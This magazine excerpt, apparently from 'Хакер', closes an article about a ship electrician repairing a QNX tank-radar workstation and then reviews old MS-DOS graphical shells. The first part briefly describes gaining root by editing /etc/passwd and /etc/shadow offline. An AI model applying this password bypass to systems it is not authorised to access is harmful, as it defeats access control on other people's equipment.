QNX 4.25, а значит, можно считать жесткий диск, снятый с рабочей станции.
   Но... Как всегда, есть «но». Система ставится только из Win9x — 95, 98, 98
SE или Millennium. После продолжительных поисков я нашел подходящий
образ Windows 98 и успешно накатил его на CD — да, в этот раз довелось
поработать и с таким раритетом :-)
   Установил и запустил Windows 98 SE, а следом QNX 6.2.0 NC.





Ну а дальше дело техники: текстовые файлы я успешно отредактировал —
удалил знак x в файле /etc/passwd и строку с информацией о пароле поль‐
зователя root в файле /etc/shadow и получил такой желанный всем хакерам
(а с недавних пор и судовым электромеханикам) root.





Бороздя  бескрайние  «морские»  просторы  жесткого  диска, я  наткнулся
на файлы с весьма любопытными названиями change_node.c и change_node .





Это оказались исходники на C и скомпилированная утилита, которая как раз
и меняет Node ID .





Пробуем запустить. И все получается!





Ребутим рабочую станцию, чтобы загрузился отредактированный образ сис‐
темы.





Node ID на резервной мастер‑станции изменен на 2. Обе рабочие станции
работают одновременно с параллельной индикацией всей информации.





Проверяю автоматическое переключение состояний между двумя станциями
(имитация выхода из строя Active Master и перевод Redundant Master в сос‐
тояние Active Master) — данные на рабочих станциях не отображаются,
сплошные системные ошибки.
   Обратное переключение — все работает. Видимо, причина в Redundant
Master Workstation. Во время перезагрузки рабочей станции заметил, что
не появилось сообщение об определении карты BlueStorm PCI, которая
обеспечивает связь рабочей станции с блоком связи Supply Communication
Unit и модулем ввода‑вывода Input-Output Box. Эти устройства собирают
и передают данные от датчиков и смежных систем в систему TankRadar STaR.
Стало понятно, что именно поэтому Redundant Master Workstation не может
работать как Active Master.
   Проверил настройки BIOS — карта BlueStorm PCI определяется, значит,
проблема на этапе загрузки ОС и инициализации оборудования.
   Загрузкой драйвера dev.bluestorm для PCI-карты занимается командный
процессор, который считывает команды из файла инициализации sysinit.n .
  В  утилите  Process  Debugger  пытаюсь  найти  загруженный  драйвер
BlueStorm PCI Card — безрезультатно. Его нет, точнее, в системе он отоб‐
ражается как зомби‑процесс.
   Помню, что до изменения Node ID при запуске рабочей станции появ‐
лялась надпись о том, что обнаружена плата BlueStorm PCI. Значит, воз‐
можная причина — некорректное изменение Node ID или незавершенная
процедура его смены. Возможно, нужна еще какая‑то дополнительная опе‐
рация.
   После долгих блужданий по интернету и изучения процессов загрузки
и инициализации в ОС QNX 4.25 я нахожу информацию, что файл инициали‐
зации sysinit.n в конце имени (вместо n) должен содержать номер Node ID.
Проверяю файл на Redundant Master Workstation — там стоит 1, а мы меняли
на 2.
   Видимо,  автоматическую  смену имени файла инициализации забыли
добавить в утилиту change_node . И снова на помощь приходит  shell: mv
sysinit.1 sysinit.2 . Имя файла изменено, перезагружаю рабочую стан‐
цию. Все, работоспособность Redundant Master Workstation полностью вос‐
становлена. Теперь система работает так, как задумано производителем:
с  автоматическим переключением между рабочими станциями в  случае
выхода из строя Active Master Workstation.
   Подводя итог, замечу, что эта статья лишь кратко описывает основные эта‐
пы восстановления рабочей станции. На деле поиск решений и проверка
гипотез растянулись на недели, а то и месяцы и в сумме заняли два рейса
и почти семь месяцев.
   Заметь,   обслуживание   всего   судового   электрооборудования —
от силовых генераторов мощностью под 1000 кВт до микроволновки на кам‐
бузе — лежит на одном‑единственном электромеханике. Нагрузка колоссаль‐
ная, поэтому восстановлением рабочей станции я занимался в свободное
от вахт время, так сказать, на голом энтузиазме.
   Анализируя проделанную работу, понимаю, что у сервисного инженера,
владеющего  сервисными  мануалами, нужными паролями и всей  необ‐
ходимой информацией, на это ушло бы не больше тридцати минут. Однако
компания оценила мои старания и выдала небольшой бонус.
  Всем спасибо за внимание. Помни: если у тебя есть сильное желание
и интерес к теме, можно сделать многое. Как говорится, try harder! © X
GEEK





Сегодня мы изучим старые графические
оболочки  для  MS-DOS,   протестируем
наиболее известные из них и вспомним
совсем забытые проекты, которые в свое                                                                           Валентин Холмогоров
                                                                               Ведущий редакторвремя пытались сделать работу с компь‐                                                                                                valentin@holmogorov.ru
ютером более наглядной и удобной. Пос‐
мотрим, что они умели на практике, чем
отличались друг от друга и почему одни
из них получили известность, а другие оста‐
лись на обочине истории.


Звучит странно, но мне нравилась MS-DOS. Впрочем, в те времена, когда я
начинал осваивать компьютер, винда уже существовала, но в Россию ее
еще не завезли. С Windows 3.11 я познакомился в весьма зрелом возрасте,
а основным инструментом для работы с файлами нам поначалу служил Norton
Commander. При этом преподы в институте твердили: «Нортон — софт
для дурака, есть командная строка» — и заставляли студентов заучивать при‐
чудливый синтаксис досовских команд.
   Парадокс в том, что при всей любви некоторых отдельно взятых личностей
к «чистому» DOS, пользоваться этой системой на трезвую голову было
не слишком комфортно: операционке катастрофически не хватало удобного
инструментария для работы с файлами и многозадачности. И поначалу MS-
DOS развивалась примерно в том же направлении, по которому позже пошел
Linux: мухи, то есть консоль, отдельно, котлеты, то есть надстройка в виде
графического интерфейса над командной строкой, отдельно. Даже первые
версии «форточек» до появления Windows 95 многие называли «оконным
файловым менеджером для DOS», поскольку они на эту самую DOS и опи‐
рались, как на фундамент.





  Знаменитая цитата из книги «Персональные ЭВМ в инженерной прак‐
  тике»

Ко всему прочему одной лишь виндой доступный юзерам арсенал графичес‐
ких возможностей отнюдь не исчерпывался: помимо Windows, в начале
девяностых существовало сразу несколько оконных интерфейсов для IBM PC
той или иной степени угробищности удобства. Часть из них создавалась
как альтернатива Windows — дешевле, быстрее, иногда просто потому, что
«мы тоже могём забацать окошки с нескучными обоями». Другие рождались
из более практичных побуждений: сделать простую оболочку для работы
на корпоративных ПК с подобием многозадачности или просто придать сис‐
теме вид, который не пугает людей, впервые увидевших клавиатуру. В резуль‐
тате вокруг MS-DOS возникла целая экосистема графических сред, о которых
сегодня вспоминают куда реже, чем о Windows 3.x, хотя технически и кон‐
цептуально многие из них были не менее интересными.
  Идея поставить и протестировать наиболее продвинутые графические
оболочки эпохи MS-DOS пришла мне в голову спонтанно. В очередной
попытке  собрать  себе  игровую  ретроконсоль  я  купил  на  известной
интернет‑барахолке древний неттоп Hewlett-Packard на процессоре VIA Eden.
Этот чип, как известно, представляет собой классический x86 и архитектурно
весьма близок к Pentium MMX, что теоретически делает такую платформу неп‐
лохим вариантом для установки Windows 9x и созданного под эту систему
софта. Мой неттоп был оснащен 512 Мбайт памяти, а вместо жесткого диска
там установлена гиговая CF-карта с адаптером CF-to-IDE.





                              Неттоп на VIA Eden

Видимо, из‑за столь диковинного накопителя ни Windows 95, ни Windows 98,
ни даже Millennium Edition на эту машину вставать не захотели. Только Win2K
установилась и заработала без проблем, однако, если я захочу погрузиться
в мир NT, у меня есть Windows 11, а на этом компьютере все‑таки предполага‐
лось запустить что‑то более олдскульное. Что удивительно, неприхотливая
MS-DOS 6.22 запустилась с первой попытки, и я подумал: пусть на этой
машине работает DOS с графическими интерфейсами «старой школы». Что
ж, сказано — сделано!


PACKARD BELL DESKTOP

В начале девяностых IBM-совместимые компьютеры выпускали все кому
не лень, и  производители брендового железа оказались в невыгодном
положении. Множество компаний штамповало похожие компьютеры с одной
и той же операционной системой и примерно одинаковыми характерис‐
тиками, и зачастую они стоили дешевле, чем «фирменная» персоналка.
Пришлось искать конкурентные преимущества, например — эксперимен‐
тировать с  собственными  графическими  оболочками,  чтобы  отличаться
от конкурентов и одновременно снижать порог входа для домашних поль‐
зователей.
   Одним из таких экспериментов и стала оболочка Packard Bell Desktop,
появившаяся в 1991 году. Это была графическая среда для MS-DOS, ори‐
ентированная прежде всего на владельцев фирменных ПК Packard Bell и пос‐
тавлявшаяся в комплекте с новыми машинами. По сути, она играла роль визу‐
ального «стартового окна»: после загрузки пользователь видел экран, содер‐
жащий набор кнопок, по нажатию на каждую из которых запускалась своя
программа.





                           Packard Bell Desktop

Управляли интерфейсом при помощи мыши. На моем неттопе большинство
этих программ не установлено, поэтому, если попробовать вызвать какую‑то,
Packard Bell Desktop выводит сообщение об ошибке.





                      Программа не установлена

Оболочка  имеет  довольно  простую  систему  настроек,  активирующуюся
нажатием на кнопку Options в верхней части окна.





                     Настройки графического интерфейса

Здесь, например, можно изменить внешний вид курсора.





                            Настройка вида курсора

Изменить расположение кнопок тоже очень просто: нужно выбрать пункт
Move в меню Options, щелкнуть мышью на  значке, который ты хочешь
переместить, и еще раз щелкнуть в той точке экрана, где он должен рас‐
полагаться. Можно поменять названия кнопок, путь к исполняемым файлам,
а если надо — создать свою собственную кнопку. Выбираем в меню настроек
Add, затем — картинку из стандартной библиотеки Packard Bell Desktop.





                         Создание новой кнопки

Останется только ввести название для новой кнопки и выбрать для нее
исполняемый файл из списка уже установленных программ либо указать путь
к нему вручную.





                     Вводим название новой кнопки

По большому счету Packard Bell Desktop представляет собой рабочий стол
с набором настраиваемых ярлыков для запуска приложений MS-DOS. Он
не добавляет в системе многозадачности и не обладает какими‑то допол‐
нительными  функциями,  однако  нельзя не  отметить крайнюю  простоту
и  удобство  этого  интерфейса,  рассчитанного  на  неподготовленного
и неопытного пользователя. Важно понимать контекст: Packard Bell тогда
делала ставку на массовый домашний рынок, где покупатели часто получали
компьютер впервые в жизни. В результате софт, поставлявшийся вместе
с ПК, должен был решать не  только  техническую, но и маркетинговую
задачу — создавать ощущение «готового к работе устройства». И с этой
задачей Packard Bell Desktop с предустановленным с завода набором прог‐
рамм справлялся отлично.
  MS-DOS в 1991 году была самой распространенной операционной сис‐
темой: к началу десятилетия она занимала доминирующую долю рынка, око‐
ло 70% поставок ОС для новых ПК, а к 1993-му — порядка 79% на x86-компь‐
ютерах. Но ее сложность считалась главным останавливающим фактором
для широкого распространения персоналок. Конечно, Packard Bell Desktop
не столь гибок, как Norton Commander, однако если Norton делал упор
на эффективность работы с файлами и был инструментом для тех, кто уже
освоился с ПК, то Packard Bell Desktop больше напоминал пульт управления
от бытовой техники. Этот интерфейс не стремился стать универсальным инс‐
трументом администрирования файловой системы — скорее, он скрывал ее
за набором кнопок, с помощью которых пользователь запускал программы,
открывал справку или переходил в «чистый DOS».


GEOWORKS ENSEMBLE

История GeoWorks Ensemble началась примерно тогда же, когда возник
Packard Bell Desktop, — в тот период индустрия только пыталась понять, каким
должен быть графический интерфейс для массового пользователя.  Тех‐
нология была разработана компанией Berkeley Softworks (позже переиме‐
нованной в GeoWorks), которую основал инженер Брайан Доэрти. Базой
для нового проекта стала 8-битная GEOS для Commodore 64 / Apple  II,
перенесенная на платформу IBM PC и адаптированная для работы поверх
MS-DOS.
   GeoWorks Ensemble сразу позиционировалась как готовая рабочая среда
«из коробки». В комплект входили текстовый процессор GeoWrite, графичес‐
кий редактор GeoDraw, файловый менеджер GeoManager и набор вспомога‐
тельных утилит вроде календаря и адресной книги. Такой подход сильно отли‐
чался от ранних версий Windows, где пользователь должен был отдельно
искать и покупать все нужные ему приложения. И в отличие от Packard Bell
Desktop, это был не просто «пусковой экран с кнопками», а полноценная
рабочая среда с базовым набором софта.
   GeoWorks   поставлялась  на   пяти   установочных   дискетах   фор‐
мата 3,5 или 5,25 дюйма. Чтобы развернуть графическую среду на своем
компьютере, пользователю нужно было загрузиться в DOS, вставить в дис‐
ковод дискету и запустить инсталлятор.





                          Установка GeoWorks Ensemble

Внешне GeoWorks Ensemble очень напоминает Windows 3.0: примерно такие
же окна, значки, VGA-палитра и проблема с настройкой экранного раз‐
решения. Но это уже намного больше похоже на полноценную операционную
систему с оконным графическим интерфейсом.





                        GeoWorks Ensemble

GeoWorks позволяла запускать DOS-программы через менеджер файлов
GeoManager.  При   старте  DOS-приложения  GeoWorks   сворачивается
или переключается в текстовый режим, и после завершения работы этой
программы ты возвращаешься обратно в GEOS. А вот запускать приложения
Windows 3.х в этой среде нельзя: это две разные графические оболочки
для DOS, у них совершенно разные API и форматы исполняемых файлов.
Впрочем, для этой среды существовали нативные GEOS-приложения, и нес‐
колько из них шли в комплекте поставки — например, текстовый редактор
GeoWrite.





                          Текстовый редактор GeoWrite

По большому счету GeoWorks и Windows 3.х были прямыми конкурентами, но у
первой имелось важное преимущество. Как и в Windows, в GeoWorks исполь‐
зовалась кооперативная многозадачность: приложения должны были «доб‐
ровольно» отдавать управление системе, но на слабом железе GeoWorks
работала  намного  быстрее.  Кроме  того,  Windows  3.0  использовала
режим 386 Enhanced Mode для полноценной многозадачности, но требова‐
ла 386-й процессор, в то время как GeoWorks обеспечивала многозадачность
даже на 80286. Юзер мог набирать документ в GeoWrite и одновременно
работать в GeoDraw, запускать  несколько программ GEOS параллельно
и переключаться между окнами.
   Выход на рынок оказался довольно успешным по меркам начала девянос‐
тых. Уже через тринадцать месяцев было отгружено более 400 тысяч копий
Ensemble, а сам продукт получил несколько наград за дизайн интерфейса.
Но дальше история пошла по знакомому для альтернативных DOS GUI сце‐
нарию.
  К 1994 году Windows 3.х закрепила лидерство Microsoft на рынке настоль‐
ных ПК, и GeoWorks постепенно свернула продвижение Ensemble для пер‐
сональных компьютеров, переключившись на встроенные системы и кар‐
манные устройства. А с выходом Windows 95 проект и вовсе закрыли, но сама
технология оказалась живучей.
   Позже GEOS пережила несколько «реинкарнаций»: сначала как NewDeal
Office для старых ПК, затем как Breadbox Ensemble уже в двухтысячных —
это была попытка оживить древнюю GEOS в тот момент, когда на рынке уже
царствовала Windows 7.
   Иными словами, GeoWorks — это не просто файловый менеджер, а попыт‐
ка построить полноценную настольную среду с приложениями, единым API
и собственной архитектурой: фактически альтернативный путь развития мас‐
сового ПК, который проиграл не из‑за технической слабости, а из‑за рыноч‐
ной динамики начала девяностых и агрессивной маркетинговой политики
Microsoft.


GAZE И КОМПАНИЯ

А вот появившаяся в феврале 1994 года Gaze — это уже типичная графичес‐
кая оболочка для MS-DOS, причем shareware: юзер мог скачать и установить
ее бесплатно, но для полноценного использования программа требовала
заплатить аж 15 фунтов стерлингов.





                              Gaze

В целом работает она примерно так же, как и Packard Bell Desktop: слева име‐
ется пять кнопок для быстрого запуска приложений, снизу — шесть «кружков»
с той же самой  функцией. Названия, изображения и пусковые ярлыки
как кружков, так и кнопок на боковой панели можно гибко настраивать.





                            Настройка кнопки в Gaze

Еще один похожий менеджер, правда бесплатный, носил название Blue.
Принцип здесь применялся близкий к Windows 3.х: рабочий стол и пусковые
ярлыки приложений, которые можно объединять в группы.





                        Графический интерфейс Blue

У этого оконного менеджера я обнаружил сразу несколько существенных
недостатков: во‑первых, в нем можно открыть только одно окно, которое
к тому же невозможно масштабировать. Во‑вторых, панель заголовка, поз‐
воляющая перемещать окно по экрану, расположена не сверху, а сбоку, что
очень непривычно и неудобно, и там имеется только одна кнопка: «Закрыть».
В‑третьих, при перемещении окна оно очень медленно перерисовывается
на экране: видимо, у разработчика лапки и он не сумел в полной мере
использовать возможности видеорежима VGA. В общем, такое себе.
  А вот интерфейс графического менеджера под названием McShellGS
95 показался мне смутно знакомым. Где‑то я уже видел такие же панельки,
окошки, значки и кнопочки…





                           McShellGS 95




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИGEEK
            GUI ВАМ!
          ВСПОМИНАЕМ ГРАФИЧЕСКИЕ
              ОБОЛОЧКИ ДЛЯ MS-DOS




Ну да, перед нами копия интерфейса классической macOS версии 7.1,
которая была актуальна в 1992 году, когда и появился McShellGS. Эта гра‐
фическая оболочка для DOS успешно развивалась вплоть до 1996 года
и была, наверное, лучшим решением для тех владельцев старых PC, которые
привыкли к эстетике Mac и не желали мириться с особенностями Windows 3.х.





                   McShellGS 95 — версия 1996 года

C появлением Windows 95 интерфейс классической «макоси» безнадежно
устарел и стал выглядеть на фоне 32-разрядных «форточек», как «запорожец»
рядом с «Теслой». Примерно тогда же этот проект и перестал развиваться,
не дотерпев буквально шесть лет до появления красивой и технически прод‐
винутой Mac OS X.
  В 1995 году программист‑любитель Джонатан Торп (Jonathan Thorpe)
родил проект c громким названием MOS — Millennium OS, явно вдохновлен‐
ный новой Windows 95.





                      MOS

Однако полноценной операционной системой это любительское поделие
назвать нельзя: оболочка не позволяла открывать больше одного окна,
перемещать его по экрану и масштабировать — строго говоря, это была все‐
го лишь примитивная надстройка над DOS, которая давала возможность раз‐
мещать на рабочем  столе пусковые ярлыки для досовских приложений
и тыкать в них мышью. Спустя пару лет этот проект с открытым исходным
кодом немного доработал 14-летний парень по имени Мюррей Паркинсон
(Murray Parkinson), сделав MOS еще больше похожей на Windows 95.





                     MOS 98

Тем не менее эта программа до чего‑то серьезного никак не дотягивала
и могла служить лишь наглядным свидетельством того, что может натворить
подросток, если в его шаловливые руки попадет QBasic и VBDOS.


DESKTOP2

История появления Desktop2 относится уже к закату эпохи DOS-оболочек —
к моменту, когда рынок начал стремительно смещаться в сторону Windows.
Если ранние графические надстройки над DOS появлялись как попытка
упростить жизнь пользователю, то Desktop2 стал скорее ответом на уже сло‐
жившуюся ситуацию доминирования полноценных графических ОС.
   Desktop2 создал немецкий программист Феликс Риттер, и произошло
это в 1998 году, хотя в окне «О программе» значатся даты 1991–1998:
видимо, работу над этим проектом Риттер начал намного раньше официаль‐
ного релиза.





                              Desktop2

К тому моменту Windows 95 уже несколько лет как стала массовым стан‐
дартом, только‑только появилась Windows 98, а сама DOS постепенно прев‐
ращалась в нишевую платформу для старых ПК и специализированных задач.
По своей идеологии Desktop2 выглядел попыткой собрать в одном месте всё,
что пользователю было нужно от «дружественной» среды DOS.
   Оболочка сочетала два основных режима — условный «рабочий стол»
для запуска программ и файловый менеджер с двухпанельным интерфейсом,
вдохновленным популярными инструментами вроде Norton Commander (хотя
гораздо  больше он  напоминает  псевдографический  Total Commander).
При этом Desktop2 не заменял DOS, а работал поверх нее, добавляя гра‐
фический интерфейс, набор утилит и более наглядную модель взаимодей‐
ствия с системой.





                     Файловый менеджер Desktop2

Помимо файлового менеджера, в комплекте поставки Desktop2 есть каль‐
кулятор и проигрыватель компакт‑дисков, а вот многозадачности в это при‐
ложение не завезли: в один момент времени можно запустить только одну
программу.





                       Проигрыватель CD в Desktop2

Зато в Desktop2 есть несколько скринсейверов, а также возможность соз‐
давать собственные пусковые ярлыки DOS-приложений и объединять их
в группы‑папки, то есть принцип здесь используется примерно такой же, как в
Windows 3.х. Можно поменять форму курсора мыши и скорость его переме‐
щения по экрану, цвет фона рабочего стола, скринсейвер по умолчанию, и на
этом диапазон доступных настроек, собственно, исчерпывается.
  По большому счету Desktop2 — это файловый менеджер для MS-DOS
с графическим интерфейсом наподобие Total Commander, поддержкой мыши
и парочкой полезных утилит. Можно управлять файлами в привычном поль‐
зователям  Norton  двухоконном  интерфейсе,  можно —  щелкая мышью
на ярлыках, отсортированных по группам. Никаких дополнительных бонусов
Desktop2 не предлагает, за исключением того, что дистрибутив этого при‐
ложения занимает всего лишь одну дискету, а для полноценной работы тре‐
бует ПК с 286-м процессором и 640 Кбайт оперативки. Довольно гуманно
по сравнению с той же виндой.


SEAL GUI

Seal GUI появился уже в тот период, когда сама идея «графического DOS»
превратилась скорее в забавное хобби для развлечения скучающих гиков.
Если ранние оболочки вроде Packard Bell Desktop или GeoWorks создавались
как альтернатива Windows 3.x, то Seal изначально разрабатывался в качестве
графической среды для мира свободного DOS — прежде всего FreeDOS.





                                 Seal GUI

Несмотря на то что Seal опирается на MS-DOS, это полноценная 32-раз‐
рядная графическая среда, пытающаяся предложить функции, которые обыч‐
но ассоциировались уже с полноценными настольными ОС. В нем были
реализованы динамическая линковка, мультимедиа, поддержка звука, мно‐
гоязычность и собственная система API для приложений.
   Проект начали энтузиасты Open Source, объединившиеся вокруг раз‐
работчика Михала Стенцла. Главная идея была довольно прямолинейной:
создать бесплатную графическую оболочку для DOS-совместимых систем —
MS-DOS, FreeDOS, DR-DOS и PC-DOS, которая могла бы стать свободной
альтернативой коммерческим GUI вроде Windows или GeoWorks.
   Появился Seal довольно поздно по меркам DOS-экосистемы. Активная
разработка шла уже в конце 1990-х — начале 2000-х, а одна из последних
официальных версий, 2.00.11, вышла в апреле 2002 года, после чего раз‐
витие проекта фактически остановилось. Поздний выход сильно повлиял
на судьбу проекта. К моменту появления Seal 2 MS-DOS уже практически
исчезла с массового рынка, а Windows XP обеспечивала совместимость
с огромным количеством старого софта. В результате Seal воспринимался
скорее как технический эксперимент или цифровой артефакт эпохи, чем
как реальная альтернатива существующим ОС.





                                 Seal GUI

Seal 2 поддерживал вытесняющую многозадачность, но только для приложе‐
ний, написанных специально под него. Для таких программ существовал
собственный API, сильно упрощенный по сравнению с WinAPI, а разработка
предполагалась через старые версии GCC. В результате теоретически можно
было запускать несколько нативных приложений одновременно, но экосис‐
тема программ оставалась крайне ограниченной.
  В комплекте поставки имелось несколько утилит, напоминающих стандар‐
тный набор софта винды: калькулятор, похожий на блокнот простой текстовый
редактор (здесь он называется SmallDit), файловый менеджер, смахивающий
на проводник на минималках, — не такой аляповатый, как в Desktop2,
но вполне функциональный. Есть даже редактор реестра, в котором можно
менять базовые настройки интерфейса.





                          Текстовый редактор SmallDit

В целом Seal 2 отдаленно похож на этакую адскую смесь Windows XP и ранней
Mac OS X, но в очень урезанном виде. С архитектурной стороны проект выг‐
лядел даже амбициознее, чем кажется на первый взгляд. В нем заявлялись
такие вещи, как динамическая система связывания библиотек, мультимедий‐
ные функции (включая звук) и поддержка нескольких языков интерфейса. То
есть разработчики пытались построить полноценную программную  плат‐
форму, а не просто красивый «лаунчер» для DOS-программ.
  Но вся эта история закончилась довольно предсказуемо. У Seal 2 не было
совместимости с Windows, а DOS-программы внутри него работали уже
без преимуществ многозадачности. К моменту появления этой графической
среды Windows XP стала самой популярной операционной системой для PC,
и конкурировать с ней было попросту нереально.
  В результате Seal GUI остался в истории именно как «свободный ответ»
DOS-сообщества на решения Microsoft и других компаний. Он не стал мас‐
совым продуктом, но хорошо показывает, что идея GUI поверх DOS — штука
живучая, хотя с течением времени она перешла из разряда коммерческих
решений в категорию пет‑проектов для энтузиастов и поклонников старого
железа.


ЗАКЛЮЧЕНИЕ

Графические оболочки для DOS создавались с разными целями: и ради
удобства пользователей, и для того, чтобы чем‑то отличаться от конкурентов.
Разработчики  пробовали  разные  идеи —  от  аккуратных  «надстроек»
над командной строкой и примитивных лаунчеров до почти полноценных опе‐
рационных систем, которые пытались соперничать с ранними версиями
Windows.
   Сегодня многие из этих проектов выглядят как технологические тупики,
но без них не было бы привычных нам интерфейсов. И именно поэтому такие
программы очень интересно изучать: эти проекты показывают, каким мог
стать персональный компьютер, если бы развитие технологий пошло немного
другим путем. © X
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» всегда нужны новые авторы, и ты можешь стать
одним из них! Если тебе интересно то, о чем мы пишем,
и есть желание исследовать эти темы вместе, не упусти воз‐
можность вступить в ряды наших авторов и получать за это
все, что им причитается.


 • Авторы получают денежное вознаграждение. Размер зависит от слож‐
   ности и уникальности темы и объема проделанной работы (но не от объ‐
  ема текста).
 • Наши авторы читают «Хакер» бесплатно : каждая опубликованная статья
   приносит месяц подписки и значительно увеличивает личную скидку. Уже
   после третьего раза подписка станет бесплатной навсегда.

Кроме того, наличие публикаций — это отличный способ показать
работодателю и коллегам, что ты в теме . Если ты студент или научный
сотрудник, публикация в журнале пригодится особенно . А еще мы пла‐
нируем запуск англоязычной версии, так что у тебя будет шанс быть
узнанным и за рубежом .
  И конечно, мы всегда указываем в статьях имя или псевдоним
автора. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что‑то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


Я ТЕХНАРЬ, А НЕ ЖУРНАЛИСТ. ПОЛУЧИТСЯ ЛИ У МЕНЯ НАПИСАТЬ
СТАТЬЮ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом‐
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ‐
ходимость. И конечно, перед публикацией мы согласуем с автором все прав‐
ки и вносим новые, если нужно.


КАК ПРИДУМАТЬ ТЕМУ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
   Первым делом задай себе несколько простых вопросов:
 • «Разбираюсь ли я в чем‑то, что может заинтересовать других?» Час‐
   тый случай: люди делают что‑то потрясающее, но считают свое занятие
   вполне  обыденным. Если  твои мама и  бабушка не  хотят  слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес‐
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Были ли у меня в последнее время интересные проекты?» Если ты
   ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что‑то необычное или даже  просто  настроил себе
   какую‑то удобную штуковину, обязательно расскажи нам! Мы вместе при‐
   думаем, как лучше подать твои наработки.
 • «Знаю ли я какую‑то историю, которая кажется мне крутой?» Поп‐
   робуй  вспомнить: если ты  буквально  недавно  рассказывал  кому‑то
  о чем‑то очень важном или захватывающем (и связанном с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Не подмечал ли я, что в Хакере упустили что‑то важное?» Если мы
  о чем‑то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под‐
   кинуть нам идею все равно можно.


Уговорили, каков план действий?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому‑то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда‐
   ет тебе правила оформления и отвечает на твои вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие‑то проб‐
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор  читает статью,  принимает ее или  возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если готов публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции .
   №2 (323)

          Андрей Письменный        Валентин Холмогоров         Илья Русанен
              Главный редактор           Ведущий редактор                  Разработка
             pismenny@glc.ru            valentin@holmogorov.ru            rusanen@glc.ru
                          Евгения Шарипова             yambuto
                           Литературный редактор           Бильд‑редактор
                                                    yambuto@gmail.com


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                    КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                               Марк Бруцкий‑Стемпковский,
                                 Олег Афонин, Nik Zerof, ret0x2A


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                          Вопросы о подписке:          ​Вопросы о материалах:
                                lapina@glc.ru                  support@glc.ru​





Учредитель: ИП Яковлева Анна Вадимовна ИНН 503806735948 ОГРН/ОГРНИП 320508100264021. Адрес: 141271, Россия, Московская область,
Пушкино, мкр Софрино-1, дом 28, квартира 58. Телефон: +7(980)4591655. Зарегистрировано Федеральной службой по надзору в сфере связи,
информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ЭЛ № ФС 77 — 73894 от 12.10.2018 года. Мнение
редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответственности
за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакционных материалов
журнала обращайтесь по адресу: content@glc.ru. © Журнал «Хакер», РФ, 2026